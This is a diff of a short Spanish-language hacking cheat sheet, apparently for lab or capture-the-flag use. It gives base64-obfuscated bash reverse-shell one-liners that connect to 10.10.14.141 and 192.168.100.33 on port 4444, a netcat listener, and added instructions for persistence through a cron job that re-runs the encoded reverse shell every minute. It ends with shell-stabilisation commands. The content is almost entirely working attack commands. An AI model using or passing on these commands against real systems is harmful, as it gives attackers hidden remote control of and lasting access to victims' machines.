@@ -1,14 +1,27 @@
 Atacante:
 
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 echo 'bash -i >& /dev/tcp/10.10.14.141/4444 0>&1' | base64
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 
 -------------------------------------
 nc -lvnp
 -------------------------------------
 Maquina victima:
 
-echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDEvNDQ0NCAwPiYxCg==' | base64 -d | bash
 
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4zMy80NDQ0IDA+JjEK' | base64 -d | bash
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+para ganar persistencia no importa que, se podria usar una tare cron al momento de iniciar, unicamente estarias a la escucha por un puerto determinado
+esto debe ser con la misma ip, debido a que el hash es distinto por cada ip privada, publica,suerte :)
+
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+echo '* * * * * echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4zMy80NDQ0IDA+JjEK' | base64 -d | bash' > /tmp/mycron.sh 
+crontab /tmp/mycron.sh
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 
 
 -------------------------------------------
@@ -22,6 +35,9 @@ Ctrl+z
 stty raw -echo; fg
 export TERM=xterm
 export SHELL=bash
+
+
+___________________________________________________________________________________________
 
 
 
